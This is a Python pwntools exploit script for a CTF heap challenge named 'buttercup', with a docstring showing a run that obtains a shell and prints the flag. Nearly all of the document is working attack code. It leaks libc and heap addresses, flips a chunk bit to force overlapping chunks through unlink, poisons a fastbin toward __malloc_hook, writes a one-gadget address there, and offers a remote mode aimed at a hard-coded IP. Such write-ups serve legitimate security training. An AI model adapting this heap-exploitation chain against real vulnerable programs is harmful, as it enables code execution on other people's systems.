"""
[+] Libc:          0x7fa5b5957000
[+] __malloc_hook: 0x7fa5b5d1bb10
[+] Heap:          0x55fc941d9000
[*] Switching to interactive mode
$ whoami
buttercup
$ ls
$ cat flag
inctf{nulls_nulls_3v3rywh3r3}
"""

from pwn import *

def alloc(size, idx):
	r.sendlineafter('>> ', '1')
	r.sendlineafter('input\n', str(size))
	r.sendlineafter('index\n', str(idx))
	return

def free(idx):
	r.sendlineafter('>> ', '2')
	r.sendlineafter('index\n', str(idx))
	return

def edit(idx, data):
	r.sendlineafter('>> ', '3')
	r.sendlineafter('index\n', str(idx))
	r.send(data)

def craft(idx, data):
	r.sendlineafter('>> ', '3')
	r.sendlineafter('index\n', str(idx))
	r.sendline(data)

def libcLeak():
	r.sendlineafter('>> ', '4')
	r.recvuntil('0 => ')
	return u64(r.recv(6).ljust(8, '\x00'))

def heapLeak(ru):
	r.sendlineafter('>> ', '4')
	r.recvuntil(ru)
	return u64(r.recv(6).ljust(8, '\x00'))

def flip(addr):
	r.sendlineafter('>> ', '1337')
	r.sendlineafter('Address : ', addr)

def pwn():

	alloc(0x88, 0)
	alloc(0x68, 1)
	alloc(0x88, 2)
	
	free(0)

	alloc(0x88, 0)

	libc    = libcLeak() - 0x3c4b78
	mhook   = libc + 0x3c4b10
	oneshot = libc + 0xf1117
	log.success("Libc:          0x{:x}".format(libc))
	log.success("__malloc_hook: 0x{:x}".format(mhook))
	
	free(0)
	# Place original chunk 0 in smallbin list & extend the top chunk
	alloc(0x90, 3)
	
	# Do the same for another chunk so that
	# its FD/BK fields point to the next/prev
	# free chunk which will be on the heap
	# Then we can leak heap's address
	free(2)
	# Place original chunk 2 in smallbin list & extend the top chunk
	alloc(0x90, 4)

	# Request back original chunk 2 => leak heap
	alloc(0x9, 5)
	
	edit(5, 'A'*9)

	heap   = heapLeak('A'*8) & 0xFFFFFFFFFFFFF000
	target = heap + 0x208
	log.success("Heap:          0x{:x}".format(heap))

	alloc(0x88, 6)
	# Set up the fake prev_size field
	edit(1, p64(0)*12 + p64(0xe0))

	# Flip the bit and fool the chunk that its
	# previous chunk is free'd so that we can overlap
	flip(str(target))

	"""
		0x555555757120:	0x0000000000000000	0x0000000000000071 <-- target coalesce
		0x555555757130:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
		0x555555757140:	0x0000000000000000	0x0000000000000000
		0x555555757150:	0x0000000000000000	0x0000000000000000
		0x555555757160:	0x0000000000000000	0x0000000000000000
		0x555555757170:	0x0000000000000000	0x0000000000000000
		0x555555757180:	0x0000000000000000	0x0000000000000000
		0x555555757190:	0x0000000000000070	0x0000000000000070 <-- still in use
		0x5555557571a0:	0x0000000000000000	0x0000000000000000
		0x5555557571b0:	0x0000000000000000	0x0000000000000000
		0x5555557571c0:	0x0000000000000000	0x0000000000000000
		0x5555557571d0:	0x0000000000000000	0x0000000000000000
		0x5555557571e0:	0x0000000000000000	0x0000000000000000
		0x5555557571f0:	0x0000000000000000	0x0000000000000000
		0x555555757200:	0x00000000000000e0	0x0000000000000090 <-- target
		0x555555757210:	0x00007ffff7dd1bf8	0x00007ffff7dd1bf8
	"""

	# Free fast chunk
	free(1)
	# Trigger unlink
	free(6)
	"""
		0x555555757120:	0x0000000000000000	0x0000000000000171 <-- coalesced chunk
		0x555555757130:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
		0x555555757140:	0x0000000000000000	0x0000000000000000
		0x555555757150:	0x0000000000000000	0x0000000000000000
		0x555555757160:	0x0000000000000000	0x0000000000000000
		0x555555757170:	0x0000000000000000	0x0000000000000000
		0x555555757180:	0x0000000000000000	0x0000000000000000
		0x555555757190:	0x0000000000000070	0x0000000000000070 <-- free
		0x5555557571a0:	0x0000000000000000	0x0000000000000000
		0x5555557571b0:	0x0000000000000000	0x0000000000000000
		0x5555557571c0:	0x0000000000000000	0x0000000000000000
		0x5555557571d0:	0x0000000000000000	0x0000000000000000
		0x5555557571e0:	0x0000000000000000	0x0000000000000000
		0x5555557571f0:	0x0000000000000000	0x0000000000000000
		0x555555757200:	0x00000000000000e0	0x0000000000000090
		0x555555757210:	0x00007ffff7dd1bf8	0x00007ffff7dd1bf8
	"""

	# Now we can overwrite the fastbin's FD with __malloc_hook
	alloc(0x100, 7)

	edit(7, p64(0)*12 + p64(0x70)*2 + p64(mhook-0x30+0xd))

	"""
		0x555555757120:	0x0000000000000000	0x0000000000000111 <-- new chunk overlaps 0x555555757190
		0x555555757130:	0x0000000000000000	0x0000000000000000
		0x555555757140:	0x0000000000000000	0x0000000000000000
		0x555555757150:	0x0000000000000000	0x0000000000000000
		0x555555757160:	0x0000000000000000	0x0000000000000000
		0x555555757170:	0x0000000000000000	0x0000000000000000
		0x555555757180:	0x0000000000000000	0x0000000000000000
		0x555555757190:	0x0000000000000070	0x0000000000000070 <-- free 
		0x5555557571a0:	0x00007ffff7dd1aed	0x0000000000000000
	"""

	# malloc will return 0x555555757190
	alloc(0x68, 8)
	# malloc will return 0x00007ffff7dd1aed
	alloc(0x68, 9)
	# __malloc_hook => one gadget
	edit(9,"H"*0x13+p64(oneshot))

	# Trigger __malloc_hook
	r.sendlineafter('>> ', '1')
	r.sendlineafter('input\n', '10')

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if sys.argv[1] == "r":
        r = remote('35.196.53.165', 1337)
        pwn()
    else:
        r = process('./buttercup')
        pause()
        pwn()
